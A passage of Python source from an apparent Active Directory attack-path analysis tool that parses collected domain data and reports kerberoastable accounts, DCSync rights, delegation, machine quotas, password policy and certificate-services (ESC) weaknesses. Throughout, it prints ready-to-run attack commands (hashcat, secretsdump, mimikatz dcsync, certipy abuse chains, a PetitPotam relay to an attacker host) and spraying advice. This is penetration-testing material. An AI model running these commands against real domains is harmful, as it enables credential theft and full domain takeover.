            nhosts = len(g.gpo_affects.get(gpo, set()))
            gpo_items.append(f"{bold(g.nodes[gpo].name.split('@')[0])} "
                             f"{dim('controllable by')} {green(', '.join(holders))} "
                             f"{dim('→ code exec on ' + str(nhosts) + ' host(s)')}")
    bullet("Non-admin GPO control", gpo_items)

    # Non-default unconstrained delegation
    unc = [n for n in g.nodes.values()
           if n.p("unconstraineddelegation") and not _is_default_unconstrained(g, n.sid)]
    bullet("Non-default unconstrained delegation",
           [red(n.name.split("@")[0]) for n in unc])

    bullet("Computers with a Domain/Enterprise Admin session (admin there = DA creds)",
           [red(g.nodes[c].name.split("@")[0]) + dim("  ← " + ", ".join(
               g.nodes[u].name.split("@")[0] for u in us if u in g.nodes))
            for c, us in _admin_sessions(g)])
    dl = _domain_lines(g)
    if len(dl) > 1:
        bullet("Domains", [(mag(t) if root else t) for t, root in dl])
    bullet("Domain trusts", [(red(t) if bad else t) for t, bad in _trust_lines(g)])

    dc_unc = [n for n in g.nodes.values()
              if n.p("unconstraineddelegation") and _is_default_unconstrained(g, n.sid)]
    if dc_unc:
        print(dim(f"\n  (default: unconstrained delegation on "
                  + ", ".join(n.name.split('@')[0] for n in dc_unc) + " — expected on DCs)"))

    # MachineAccountQuota
    if g.maq is not None:
        if isinstance(g.maq, int) and g.maq > 0:
            uo = len(_user_owned_computers(g))
            print(red(f"\n  MachineAccountQuota = {g.maq}  —  any authenticated user can join "
                      f"up to {g.maq} machine account(s) (enables RBCD / Shadow-Creds pivots)."))
            if uo:
                print(dim(f"     {uo} computer(s) are already owned by non-admin users — option 19 / `maq`."))
        else:
            print(dim(f"\n  MachineAccountQuota = {g.maq}  (users cannot add machines)."))
    print(dim("\n  Full admin-group membership: option 9 (DA's & high-value groups)."))

def _list_kind(g, kind):
    rows = [n for n in g.nodes.values() if n.kind == kind]
    rows.sort(key=lambda n: n.name)
    header(f"{kind}s ({len(rows)})")
    for n in rows:
        fl = flags_for(g, n)
        extra = ""
        if kind == "User":
            grps = _group_names(g, n.sid)
            if grps:
                extra += dim("  ∈ " + ", ".join(grps))
        print(f"  {g.label(n.sid)}" + (("   " + fl) if fl else "") + extra)
        if kind == "User":
            for line in _user_detail_lines(g, n):
                print(dim(f"       {line}"))

def cmd_users(g, args):     _list_kind(g, "User")
def cmd_computers(g, args): _list_kind(g, "Computer")

def cmd_groups(g, args):
    rows = [n for n in g.nodes.values() if n.kind == "Group"]
    rows.sort(key=lambda n: (not g.is_highvalue(n.sid), n.name))
    header(f"Groups ({len(rows)})")
    for n in rows:
        hv = g.is_highvalue(n.sid)
        tag = f"  {red('[HIGH-VALUE: ' + hv + ']')}" if hv else ""
        print(f"  {g.label(n.sid)}  {dim('members=' + str(len(n.members)))}{tag}")

def _expand_members(g, sid, seen=None):
    if seen is None:
        seen = {}
    n = g.nodes.get(sid)
    if not n:
        return seen
    for m in n.members:
        if m not in seen:
            seen[m] = len(seen)
            mn = g.nodes.get(m)
            if mn and mn.kind == "Group":
                _expand_members(g, m, seen)
    return seen

def cmd_members(g, args):
    sid = g.resolve(args.principal)
    if not sid:
        raise SystemExit(red(f"[!] not found: {args.principal}"))
    n = g.nodes[sid]
    header(f"Members of {n.name}")
    direct = set(n.members)
    allm = _expand_members(g, sid)
    if not allm:
        print(dim("  (no members)"))
        return
    for m in sorted(allm, key=lambda s: g.nodes.get(s, Node(s)).name):
        tag = "" if m in direct else dim("  (nested)")
        print(f"  {g.label(m)}{tag}")

def _roast_mark(g, sid):
    """'!ROAST' style note if a principal is kerberoastable / AS-REP roastable.
    Only USER accounts — computer SPNs have uncrackable random passwords."""
    n = g.nodes.get(sid)
    if not n or n.kind != "User":
        return ""
    marks = []
    if (n.p("hasspn") or n.p("serviceprincipalnames")) and sid.rsplit("-", 1)[-1] != "502":
        enc, _ = _roast_enc_tag(n)
        marks.append(f"Kerberoastable/{_A_plain(enc)}")
    if n.p("dontreqpreauth"):
        marks.append("AS-REP")
    return red(" [⚠ " + ", ".join(marks) + "]") if marks else ""

def _A_plain(s):
    """Strip ANSI so a colored token can sit inside another colored string."""
    import re
    return re.sub(r"\033\[[0-9;]*m", "", s)

def cmd_das(g, args, brief=False):
    header("Domain admins & high-value groups")
    targets = [(sid, g.is_highvalue(sid)) for sid, n in g.nodes.items()
               if n.kind == "Group" and g.is_highvalue(sid)]
    targets.sort(key=lambda t: (t[1] or "").lower())
    maxw = max((len(g.nodes[s].name.split("@")[0]) for s, _ in targets), default=10)
    roastable_here = False
    for sid, hv in targets:
        n = g.nodes[sid]
        humans = [m for m in _expand_members(g, sid)
                  if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer")]
        name = n.name.split("@")[0].ljust(maxw)
        if humans:
            parts = []
            for m in sorted(humans, key=lambda m: g.nodes[m].name):
                rm = _roast_mark(g, m)
                if rm:
                    roastable_here = True
                parts.append(green(g.nodes[m].name.split("@")[0]) + rm)
            print(f"  {red(name)}  {bold(str(len(humans)))}  " + ", ".join(parts))
        else:
            print(f"  {dim(name)}  {dim('0')}")
    if roastable_here:
        print(red("\n  ⚠ A privileged member above is roastable — cracking it is a direct"
                  " path to Domain Admin (no ACL chain needed)."))

def cmd_kerberoastable(g, args):
    header("Kerberoastable accounts (SPN set)")
    da_set = _da_member_set(g)
    priv_all = _priv_set(g)
    rows = [n for n in g.nodes.values()
            if n.kind == "User" and (n.p("hasspn") or n.p("serviceprincipalnames"))
            and n.sid.rsplit("-", 1)[-1] != "502"]
    # privileged first, then RC4 (easy) before AES (hard)
    rows.sort(key=lambda n: (n.sid not in da_set, not n.p("admincount"),
                             "RC4" not in (_enc_types(n) or {"RC4"}), n.name))
    if not rows:
        print(dim("  (none)"))
        return
    print(dim("  crack: RC4 → hashcat -m 13100 · AES → -m 19600/19700 "
              "(prefix $krb5tgs$<etype>$).  ★ = privileged account."))
    for n in rows:
        spns = n.p("serviceprincipalnames") or []
        enc, _hint = _roast_enc_tag(n)
        is_priv = n.sid in da_set or n.sid in priv_all or n.p("admincount")
        nm = n.name.split("@")[0]
        # privileged roastable accounts are the prize — colour the whole entry
        label = (bold(red("★ " + nm)) + dim(" (User)")) if is_priv else g.label(n.sid)
        print(f"  {label}  {enc}")
        spnl = [str(s) for s in (spns if isinstance(spns, list) else [spns])]
        if spnl:
            more = f"  (+{len(spnl) - 2})" if len(spnl) > 2 else ""
            print(dim("      " + ", ".join(spnl[:2]) + more))

def cmd_asreproastable(g, args):
    header("AS-REP roastable accounts (no Kerberos pre-auth)")
    rows = [n for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth")]
    if not rows:
        print(dim("  (none)"))
    for n in rows:
        fl = flags_for(g, n)
        print(f"  {g.label(n.sid)}" + (("  " + fl) if fl else ""))

def cmd_rights(g, args):
    want = args.right
    alias = {"gw": "GenericWrite", "ga": "GenericAll", "fcp": "ForceChangePassword",
             "wdacl": "WriteDacl", "wowner": "WriteOwner", "akcl": "AddKeyCredentialLink"}
    want = alias.get(want.lower(), want)
    header(f"Principals holding '{want}' over something")
    out = []
    for sid, n in g.nodes.items():
        for (psid, right, inh) in n.aces:
            if right.lower() == want.lower():
                out.append((psid, sid, inh))
    out.sort(key=lambda t: g.nodes.get(t[0], Node(t[0])).name)
    for psid, tsid, inh in out:
        tn = g.nodes.get(tsid)
        tag = dim("  (inherited)") if inh else ""
        print(f"  {g.label(psid)}  {dim('->')}  {g.label(tsid)}{tag}")
        print(dim(f"       {technique(want, tn.kind if tn else '', tn.name if tn else tsid)}"))
    if not out:
        print(dim("  (none)"))

def cmd_control(g, args, full=False):
    sid = g.resolve(args.principal)
    if not sid:
        raise SystemExit(red(f"[!] not found: {args.principal}"))
    header(f"Outbound control of {g.nodes[sid].name}")
    truncated = False
    CAP = 10 ** 9 if full else 8

    # A target preview that calls out the high-value ones first, then the rest.
    def _tgt_preview(tgts):
        hvs = [t for t in tgts if g.is_highvalue(t)]
        rest = [t for t in tgts if not g.is_highvalue(t)]
        nm = lambda t: g.nodes[t].name.split("@")[0] if g.nodes.get(t) else str(t)
        out = [red("★ " + nm(t)) for t in sorted(hvs, key=nm)[:5]]
        out += [nm(t) for t in sorted(rest, key=nm)[:max(0, 8 - len(out))]]
        extra = len(tgts) - min(len(tgts), len(out))
        return ", ".join(out) + (dim(f"  … +{extra} more") if extra > 0 else "")

    # Direct ACL edges, grouped by right so the "what you get" is said ONCE per
    # right instead of once per (identical) target.
    direct = [(d, l) for (d, l) in g.ctrl.get(sid, []) if l != "MemberOf"]
    by_right = defaultdict(list)
    for (dst, lbl) in direct:
        by_right[lbl].append(dst)
    by_right = {r: list(dict.fromkeys(v)) for r, v in by_right.items()}       # dedupe targets
    print(bold(f"  Direct rights (held by this principal itself) — "
               f"{sum(len(v) for v in by_right.values())}:"))
    if not by_right:
        print(dim("     (none held directly)"))
    else:
        for lbl in sorted(by_right, key=lambda r: (-len(by_right[r]), r)):
            tgts = by_right[lbl]
            kinds = {g.nodes[t].kind for t in tgts if g.nodes.get(t)}
            tech = _tech_short(lbl, next(iter(kinds)) if len(kinds) == 1 else "")
            print(f"    {bold(_edge_render(lbl))} {dim('(' + str(len(tgts)) + ')')}"
                  + (dim("  — " + tech) if tech else ""))
            print(f"       {dim('over:')} {_tgt_preview(tgts)}")

    # Rights inherited from the groups this principal belongs to (transitively),
    # grouped by (group, right) for the same reason.
    closure = _principal_closure(g, sid)
    inh = defaultdict(list)                       # (group_sid, right) -> [targets]
    for grp in closure:
        if grp == sid or not (g.nodes.get(grp) and g.nodes[grp].kind == "Group"):
            continue
        for (dst, lbl) in g.ctrl.get(grp, []):
            if lbl != "MemberOf":
                inh[(grp, lbl)].append(dst)
    inh = {k: list(dict.fromkeys(v)) for k, v in inh.items()}                 # dedupe targets
    if inh:
        total = sum(len(v) for v in inh.values())
        print(bold(f"\n  Inherited rights (held by groups you're a member of) — {total}:"))
        for (grp, lbl) in sorted(inh, key=lambda k: (-len(inh[k]), g.nodes[k[0]].name, k[1])):
            tgts = inh[(grp, lbl)]
            kinds = {g.nodes[t].kind for t in tgts if g.nodes.get(t)}
            tech = _tech_short(lbl, next(iter(kinds)) if len(kinds) == 1 else "")
            print(f"    {dim('via ' + g.nodes[grp].name.split('@')[0] + ':')} "
                  f"{bold(_edge_render(lbl))} {dim('(' + str(len(tgts)) + ')')}"
                  + (dim("  — " + tech) if tech else ""))
            print(f"       {dim('over:')} {_tgt_preview(tgts)}")

    # Effective (transitive) reach: everything this principal can ultimately own.
    # On a real domain this is thousands of objects, so it's collapsed to a short
    # preview with the nearest-in-hops first; 'x' (interactive) expands it fully.
    reach = g.reachable(sid)
    users, comps, groups, hv = [], [], [], []
    for s, (hops, _) in reach.items():
        if s == sid:
            continue
        n = g.nodes.get(s)
        if not n:
            continue
        if g.is_highvalue(s):
            hv.append((s, hops))
        if n.kind == "User":
            users.append((s, hops))
        elif n.kind == "Computer":
            comps.append((s, hops))
        elif n.kind == "Group":
            groups.append((s, hops))
    print(bold(f"\n  Effective reach (via ACL + group chains): "
               f"{len(users)} user(s), {len(comps)} computer(s), {len(groups)} group(s)"))
    if hv:
        print(red("     high-value reached: "
                  + ", ".join(sorted({g.is_highvalue(s) for s, _ in hv}))))

    def _preview(items, label, color):
        nonlocal truncated
        if not items:
            return
        srt = sorted(items, key=lambda t: (t[1], g.nodes[t[0]].name))
        shown = ", ".join(f"{g.nodes[s].name.split('@')[0]}{dim('(' + str(h) + 'h)')}"
                          for s, h in srt[:CAP])
        extra = len(srt) - CAP
        print(f"     {label}: {color(shown)}"
              + (dim(f"  … +{extra} more") if extra > 0 else ""))
        if extra > 0:
            truncated = True

    _preview(users, "users you can control", green)
    _preview(comps, "computers you can control", cyan)
    _preview(groups, "groups you can take over", yellow)
    if truncated and not full:
        print(dim("     (showing the nearest 8 of each — press x to list every controlled object)"))

    # The payoff: of the computers reached, which are a DC or expose a
    # privileged user? Those turn LAPS / local-admin into a path to high-value.
    if comps:
        priv = _priv_set(g)
        juicy = [(s, _computer_value(g, s, priv)[1]) for s, _ in comps]
        juicy = [(s, t) for s, t in juicy if t]
        if juicy:
            print(bold(red(f"\n  ★ High-value among the {len(comps)} computer(s) you control"
                           f"  ({len(juicy)} — read LAPS / local admin here → steal those creds):")))
            jcap = len(juicy) if full else 15
            for s, tags in sorted(juicy, key=lambda e: (not _is_dc(g, e[0]), g.nodes[e[0]].name))[:jcap]:
                print(f"     {blue(g.nodes[s].name.split('@')[0])}  {red('· ' + ' · '.join(tags))}")
            if len(juicy) > jcap:
                truncated = True
                print(dim(f"     … +{len(juicy) - jcap} more — press f to filter, x to list all"))
    return truncated

def cmd_controllers(g, args):
    sid = g.resolve(args.principal)
    if not sid:
        raise SystemExit(red(f"[!] not found: {args.principal}"))
    header(f"Who can take over {g.nodes[sid].name} (inbound)")
    inb = g.rctrl.get(sid, [])
    if not inb:
        print(dim("  (nobody via collected edges)"))
    for (src, lbl) in sorted(inb, key=lambda e: g.nodes.get(e[0], Node(e[0])).name):
        print(f"  {g.label(src)}  {dim('--' + lbl + '-->')}  this")

def cmd_dcsync(g, args):
    header("DCSync-capable principals")
    found = False
    any_unresolved = False
    for dsid in g.domain_sids:
        seen = set()
        for (src, lbl) in g.rctrl.get(dsid, []):
            if (lbl == "DCSync" or lbl in REPL_RIGHTS) and src not in seen:
                seen.add(src)
                found = True
                default = _is_default_dcsync(g, src)
                dtag = dim("  [default — DA/DC/EA, expected]") if default else red("  [NON-DEFAULT ⚠]")
                n = g.nodes.get(src)
                print(f"  {g.label(src)}  {dim('→ DCSync ' + g.nodes[dsid].name.split('@')[0])}{dtag}")
                if n and n.kind == "Group":
                    mem = [g.nodes[m].name.split("@")[0] for m in _expand_members(g, src)
                           if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer")]
                    if mem:
                        print(dim("       members: " + ", ".join(sorted(mem)[:30])
                                  + (f" … +{len(mem) - 30}" if len(mem) > 30 else "")))
                elif not n and not _sid_hint(src):
                    any_unresolved = True
                    print(dim(f"       unresolved SID {src} — this principal isn't in the collection"))
                    print(dim("       (likely a deleted account, a trust/foreign-domain principal,"))
                    print(dim("        or an object SharpHound/RustHound didn't collect). "
                              "Last part after the final '-' is its RID."))
    if not found:
        print(dim("  (none detected - need GetChanges + GetChangesAll on the domain)"))
    else:
        print(dim("\n  Dump with:  secretsdump / nxc smb <dc> -u U -p P --ntds"
                  "   (or mimikatz lsadump::dcsync)"))
        if any_unresolved:
            print(dim("  To act on an unresolved SID: resolve it first — "
                      "`nxc ldap <dc> -u U -p P --query \"(objectSid=<SID>)\" sAMAccountName` "
                      "or PowerView ConvertFrom-SID — then target that account."))

def cmd_delegation(g, args):
    header("Delegation")
    unc = [n for n in g.nodes.values() if n.p("unconstraineddelegation")]
    print(bold("  Unconstrained ") + dim("— coerce a target (PrinterBug/PetitPotam) to auth to this host,"))
    print(dim("    then pull its TGT from memory. Coerce a DC → DCSync. (Own the host first.)"))
    for n in unc or []:
        if _is_default_unconstrained(g, n.sid):
            print(dim(f"    - {g.nodes[n.sid].name.split('@')[0]}  [default — expected on DCs]"))
        else:
            print(f"    {red('!')} {g.label(n.sid)}")
    if not unc:
        print(dim("    (none)"))

    con = [n for n in g.nodes.values() if n.allowed_to_delegate]
    print(bold("\n  Constrained (AllowedToDelegate) ") + dim("— if you own the account below, S4U2Proxy"))
    print(dim("    lets you request a ticket to the listed SPN(s) as ANY user, including a DA."))
    for n in con or []:
        print(f"    {g.label(n.sid)} {dim('can delegate to →')}")
        for t in n.allowed_to_delegate:
            print(f"        {g.label(t)}")
    if not con:
        print(dim("    (none)"))

    rbcd = [n for n in g.nodes.values() if n.allowed_to_act]
    print(bold("\n  Resource-based constrained (AllowedToAct) ") + dim("— if you own the principal that can act,"))
    print(dim("    S4U2Self+S4U2Proxy to impersonate any user to that computer → SYSTEM on it."))
    for n in rbcd or []:
        print(f"    on {g.label(n.sid)}:")
        for t in n.allowed_to_act:
            print(f"        {g.label(t)} {dim('can act as any user → take over the host')}")
    if not rbcd:
        print(dim("    (none)"))

def cmd_dcs(g, args):
    header("Domain controllers")
    dcs = [n for n in g.nodes.values() if n.kind == "Computer" and _is_dc(g, n.sid)]
    if not dcs:
        print(dim("  (no computers classified as DCs — check the computers collection)"))
        return
    for n in sorted(dcs, key=lambda x: x.name):
        rodc = n.primary_group and n.primary_group.rsplit("-", 1)[-1] == "521"
        tag = yellow("  [RODC]") if rodc else ""
        os_ = n.p("operatingsystem")
        extra = dim("  " + os_) if os_ else ""
        unc = red("  [unconstrained delegation]") if n.p("unconstraineddelegation") else ""
        print(f"  {blue(n.name)}{tag}{extra}{unc}")
        admins = [a for (a, l) in g.rctrl.get(n.sid, []) if l == "AdminTo"]
        if admins:
            print(dim("      local admins: "
                      + ", ".join(sorted(g.label(a) for a in admins))))
    print(dim("\n  SYSTEM on a DC = domain compromise (DCSync / NTDS). These are the crown jewels."))

def cmd_maq(g, args, full=False):
    header("MachineAccountQuota & user-owned machines")
    if g.maq is None:
        print(dim("  (machineaccountquota not present in the domain collection)"))
    elif isinstance(g.maq, int) and g.maq > 0:
        print(red(f"  MachineAccountQuota = {g.maq}"))
        print(dim(f"  → any authenticated user can create up to {g.maq} computer account(s)."))
        print(dim("    Useful for RBCD (add a machine, configure AllowedToAct) and"))
        print(dim("    Shadow-Credentials / certificate pivots where you need a controlled principal."))
    else:
        print(f"  MachineAccountQuota = {bold(str(g.maq))}  "
              + dim("(0 → standard users cannot add machines)"))

    owned = _user_owned_computers(g)
    truncated = False
    if owned:
        by_owner = defaultdict(list)
        for o, c in owned:
            by_owner[o].append(c)
        print(bold(f"\n  Computers owned by non-admin users ({len(owned)}):"))
        cap = 10 ** 9 if full else 8
        for o, comps in sorted(by_owner.items(), key=lambda kv: -len(kv[1])):
            names = sorted(g.nodes[c].name.split("@")[0] for c in comps)
            cs = ", ".join(names[:cap])
            extra = len(names) - cap
            line = (f"    {green(g.nodes[o].name.split('@')[0])} "
                    f"{dim('owns →')} {dim('(' + str(len(names)) + ')')} {blue(cs)}")
            if extra > 0:
                line += dim(f"  … +{extra} more")
                truncated = True
            print(line)
        print(dim("    (owner of a computer object = full control → RBCD / Shadow Creds → SYSTEM)"))
        if truncated and not full:
            print(dim("    (showing 8 per owner — press x to list every machine account)"))
    else:
        print(dim("\n  No computer objects are owned by non-admin users in this data."))
    return truncated

_PWPOLICY_KEYS = ("minpwdlength", "pwdhistorylength", "maxpwdage", "minpwdage",
                  "pwdproperties", "lockoutthreshold", "lockoutduration",
                  "lockoutobservationwindow")

def _has_pwpolicy(g):
    d = g.nodes.get(g.domain_sids[0]) if g.domain_sids else None
    return bool(d and any(d.p(k) not in (None, "") for k in _PWPOLICY_KEYS))

def cmd_pwpolicy(g, args):
    header("Domain password policy")
    d = g.nodes.get(g.domain_sids[0]) if g.domain_sids else None
    if not d:
        print(dim("  (no domain object in this collection)"))
        return
    if not _has_pwpolicy(g):
        print(dim("  Password-policy attributes were not collected for this domain"))
        print(dim("  (this collector/run didn't gather them). Nothing to show."))
        return

    def row(label, key, note=""):
        v = d.p(key)
        if v in (None, ""):
            v = dim("not collected")
        print(f"    {dim(label + ':'):<34} {v}" + (dim("   " + note) if note else ""))

    row("Minimum password length", "minpwdlength")
    row("Password history", "pwdhistorylength")
    row("Maximum password age", "maxpwdage")
    row("Minimum password age", "minpwdage")
    # complexity flag (DOMAIN_PASSWORD_COMPLEX = 0x1 in pwdProperties)
    pp = d.p("pwdproperties")
    if isinstance(pp, int):
        comp = "enabled" if pp & 0x1 else "disabled"
        print(f"    {dim('Password complexity:'):<34} {comp}  {dim('(pwdProperties=' + str(pp) + ')')}")
    lock = d.p("lockoutthreshold")
    if lock in (None, ""):
        lock_s = dim("not collected")
    elif lock in (0, "0"):
        lock_s = red("0  ← no lockout")
    else:
        lock_s = str(lock)
    print(f"    {dim('Lockout threshold:'):<34} {lock_s}")
    row("Lockout duration", "lockoutduration")
    row("Lockout observation window", "lockoutobservationwindow")
    row("Functional level", "functionallevel")
    if lock in (0, "0"):
        print(red("\n  ⚠ Lockout threshold is 0 → no account lockout."
                  " Password spraying is safe (watch for other monitoring)."))
    elif lock in (None, ""):
        print(dim("\n  Lockout threshold wasn't collected — don't assume it's safe to spray."))
    else:
        print(dim(f"\n  Lockout after {lock} bad attempts — spray slowly (1 try per account"
                  " per observation window) to avoid locking people out."))

def cmd_adminto(g, args):
    header("Local admin rights (AdminTo)")
    found = False
    for sid, n in g.nodes.items():
        if n.kind != "Computer":
            continue
        admins = [a for (a, l) in g.rctrl.get(sid, []) if l == "AdminTo"]
        if admins:
            found = True
            print(f"\n  {blue(n.name.split('@')[0])}  {dim('(admins:)')}")
            for a in sorted(admins, key=lambda s: g.nodes.get(s, Node(s)).name):
                print(f"      {red('→')} {g.label(a)}")
    if not found:
        print(dim("  (no AdminTo / local-admin data in this collection)"))

SERVICE_HINT = {
    "MSSQLSVC": "MSSQL database", "HTTP": "web / HTTP(S)", "CIFS": "file share (SMB)",
    "HOST": "host services", "LDAP": "directory", "GC": "global catalog",
    "TERMSRV": "RDP", "WSMAN": "WinRM", "HTTPS": "web (HTTPS)", "FTP": "FTP",
    "DNS": "DNS", "SMTP": "mail", "IMAP": "mail", "POP": "mail",
    "WSMANSVC": "WinRM", "EXCHANGEMDB": "Exchange mailbox", "MSSQL": "MSSQL database",
    "RPC": "RPC", "NFS": "NFS", "SIP": "Lync/Skype", "VNC": "VNC",
    "AFPSERVER": "Apple file", "DCOM": "DCOM", "KADMIN": "Kerberos admin",
}

def cmd_spns(g, args):
    header("SPN / service accounts — services exposed")
    rows = [n for n in g.nodes.values()
            if n.kind == "User" and (n.p("hasspn") or n.p("serviceprincipalnames"))
            and n.sid.rsplit("-", 1)[-1] != "502"]
    if not rows:
        print(dim("  (none)"))
        return
    da_set = _da_member_set(g)
    rows.sort(key=lambda x: (x.sid not in da_set, not x.p("admincount"),
                             "RC4" not in (_enc_types(x) or {"RC4"}), x.name))
    for n in rows:
        spns = n.p("serviceprincipalnames") or []
        if not isinstance(spns, list):
            spns = [spns]
        classes = sorted({s.split("/")[0].split(":")[0].upper() for s in spns if "/" in s})
        svc = "  ".join(
            bold(c) + (dim(f" ({SERVICE_HINT[c]})") if c in SERVICE_HINT else "")
            for c in classes) or dim("?")
        enc, hint = _roast_enc_tag(n)
        priv = _priv_roast_tag(g, n.sid, da_set)
        icon = bold(red("⚠ ROASTABLE ADMIN")) if (n.sid in da_set or n.p("admincount") or g.is_highvalue(n.sid)) \
            else bold(red("⚑ Kerberoastable"))
        print(f"\n  {g.label(n.sid)}  {icon} {enc}{priv}")
        print(dim(f"      roast: {hint}"))
        print(f"      services:  {svc}")
        for s in spns:
            print(dim(f"        {s}"))
        reach = g.reachable(n.sid)
        hv = sorted({g.is_highvalue(s) for s in reach if s != n.sid and g.is_highvalue(s)})
        if hv:
            print(red(f"      ⇒ if cracked, reaches: {', '.join(hv)}"))

def _eku_label(oid):
    return EKU_NAMES.get(oid, oid)

def _template_cn(t):
    """The template CN certipy's -template wants (the name before @DOMAIN)."""
    return str(t.get("name", "?")).split("@")[0]

def _ca_name(ca):
    """The CA name certipy's -ca wants."""
    return ca["props"].get("caname") or str(ca.get("name", "?")).split("@")[0]

def _ca_host(ca):
    """The CA host FQDN certipy's -target wants (resolve -dc-ip from it)."""
    return ca["props"].get("dnshostname") or str(ca.get("name", "?")).split("@")[0]

def _adcs_domain(g, t=None):
    if t and t["props"].get("domain"):
        return str(t["props"]["domain"])
    if g.cas and g.cas[0]["props"].get("domain"):
        return str(g.cas[0]["props"]["domain"])
    return g.domain_name or "DOMAIN"

def _ca_publishers(g, t):
    """The CA(s) that publish a template. Uses EnabledCertTemplates /
    UnresolvedPublishedTemplates when collected; falls back to the lone CA."""
    cn = _template_cn(t).upper()
    full = str(t.get("name", "")).upper()
    pubs = []
    for ca in g.cas:
        pub = (ca["props"].get("enabledcerttemplates")
               or ca["props"].get("unresolvedpublishedtemplates") or [])
        if isinstance(pub, str):
            pub = [pub]
        names = {str(x).split("@")[0].upper() for x in pub} | {str(x).upper() for x in pub}
        if cn in names or full in names:
            pubs.append(ca)
    if not pubs and len(g.cas) == 1:        # single CA in the collection -> it's the publisher
        pubs = list(g.cas)
    same = [ca for ca in pubs if ca.get("domain") and ca.get("domain") == t.get("domain")]
    return same or pubs

def _login_name(g, sid, dom):
    """A certipy -u value for a principal (sam@domain; machine accounts keep the $)."""
    n = g.nodes.get(sid)
    if not n:
        return f"<principal>@{dom}"
    sam = n.p("samaccountname") or n.name.split("@")[0]
    return f"{sam}@{dom}"

def _impersonation_targets(g):
    """High-value USER accounts worth impersonating in an ESC1/ESC4 SAN abuse, each with the
    SID certipy needs for -sid and a UPN for -upn. Administrator (RID 500) first, then
    Domain/Enterprise Admin members."""
    out, seen = [], set()
    def add(sid, label):
        n = g.nodes.get(sid)
        if not n or n.kind != "User" or sid in seen:
            return
        seen.add(sid)
        upn = n.p("userprincipalname") or n.p("name") or n.name
        out.append((n.name.split("@")[0], sid, str(upn), label))
    for sid, n in g.nodes.items():
        if n.kind == "User" and str(sid).rsplit("-", 1)[-1] == "500":
            add(sid, "built-in Administrator")
    for sid, n in g.nodes.items():
        if n.kind == "Group" and str(sid).rsplit("-", 1)[-1] in ("512", "519"):
            label = "Domain Admin" if str(sid).rsplit("-", 1)[-1] == "512" else "Enterprise Admin"
            for m in _expand_members(g, sid):
                add(m, label)
    return out

def _certipy_lines(code, dom, caname, cahost, cn, enroller_upn, tgt_upn, tgt_sid):
    """Ready-to-adapt certipy command(s) for an ESC code. Password / DC-IP are placeholders."""
    base = (f"certipy req -u {enroller_upn} -p '<password>' -dc-ip <DC_IP> "
            f"-ca {caname} -target {cahost} -template {cn}")
    pfx = (tgt_upn.split('@')[0] or 'target').lower()
    if code == "ESC1":
        return [f"{base} \\",
                f"    -upn {tgt_upn} -sid {tgt_sid}",
                f"certipy auth -pfx {pfx}.pfx -dc-ip <DC_IP>"]
    if code == "ESC4":
        return ["# you can WRITE the template -> make it ESC1, request, then restore it:",
                f"certipy template -u {enroller_upn} -p '<password>' -dc-ip <DC_IP> "
                f"-template {cn} -write-default-configuration -save-configuration {cn}.json",
                f"{base} \\",
                f"    -upn {tgt_upn} -sid {tgt_sid}",
                f"certipy template -u {enroller_upn} -p '<password>' -dc-ip <DC_IP> "
                f"-template {cn} -configuration {cn}.json      # restore",
                f"certipy auth -pfx {pfx}.pfx -dc-ip <DC_IP>"]
    if code == "ESC3":
        return ["# enrollment-agent template -> request an agent cert, then on-behalf-of the target:",
                f"{base}      # agent cert -> {enroller_upn.split('@')[0]}.pfx",
                f"certipy req -u {enroller_upn} -p '<password>' -dc-ip <DC_IP> "
                f"-ca {caname} -target {cahost} -template User \\",
                f"    -pfx {enroller_upn.split('@')[0]}.pfx -on-behalf-of '{dom.split('.')[0].upper()}\\\\{tgt_upn.split('@')[0]}'",
                f"certipy auth -pfx {tgt_upn.split('@')[0].lower()}.pfx -dc-ip <DC_IP>"]
    if code == "ESC2":
        return ["# Any-Purpose EKU: the issued cert is valid for client auth as the enroller;",
                "# if it also supplies the subject (ESC1) add -upn/-sid; else chain via an agent.",
                base]
    if code == "ESC9":
        return ["# No-security-extension: needs GenericWrite over a victim you control -",
                f"# set victim's userPrincipalName to '{tgt_upn.split('@')[0]}' (no $), then:",
                base,
                f"certipy auth -pfx <victim>.pfx -dc-ip <DC_IP>   # maps to {tgt_upn.split('@')[0]}"]
    if code == "ESC15":
        return ["# schema-v1 template: inject the Client Authentication application policy",
                "# (unpatched CAs only - CVE-2024-49019, fixed Nov 2024):",
                f"{base} \\",
                f"    -upn {tgt_upn} -sid {tgt_sid} -application-policies 'Client Authentication'",
                f"certipy auth -pfx {pfx}.pfx -dc-ip <DC_IP> -ldap-shell"
                "      # if PKINIT refuses it, use the LDAP shell"]
    if code == "ESC13":
        me = enroller_upn.split('@')[0].lower()
        return ["# the cert's issuance policy is linked to a group - its TGT carries that group:",
                base,
                f"certipy auth -pfx {me}.pfx -dc-ip <DC_IP>      # then use the ccache as {me}"]
    return [base]

def _esc8_lines(dom, cahost, tmpl, dc):
    return [f"certipy relay -target http://{cahost} -template {tmpl}",
            f"petitpotam.py -u <user> -p '<password>' -d {dom} <ATTACKER_IP> {dc}"
            "      # or printerbug.py / coercer",
            f"certipy auth -pfx {dc.split('.')[0].lower()}.pfx -dc-ip <DC_IP>      # DC$ hash",
            f"secretsdump.py -hashes :<NT> '{dom}/{dc.split('.')[0].upper()}$'@{dc} -just-dc"]

def cmd_adcs(g, args):
    header("Active Directory Certificate Services (ESC) analysis")
    if not g.templates and not g.cas:
        print(dim("  (no ADCS data in this collection)"))
        return
    dom = _adcs_domain(g)
    for ca in g.cas:
        print(bold(f"\n  CA: {ca['name']}"))
        print(dim(f"      certipy:  -ca {bold(_ca_name(ca))}   -target {bold(_ca_host(ca))}"
                  f"   (domain {_adcs_domain(g)})"))
        if ca.get("user_san"):
            print(red("      ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 (user-specified SAN)"))
        e8 = ca.get("esc8") or {}
        if e8.get("edge"):
            print(red("      ESC8: NTLM-relayable web enrollment: " + ", ".join(e8["urls"])))
            print(red(f"            any domain user -> coerce {e8['coerce'][0]} -> relay -> "
                      f"{e8['template']} cert -> DCSync"))
            print(cyan("      certipy ESC8:"))
            for line in _esc8_lines(str(ca["props"].get("domain") or dom), _ca_host(ca),
                                    e8["template"], e8["coerce"][0]):
                print(cyan(f"        {line}"))
        elif e8.get("urls"):
            print(yellow("      ESC8: relayable web enrollment " + ", ".join(e8["urls"])
                         + f" - but {e8['why']}"))
        elif ca.get("http"):
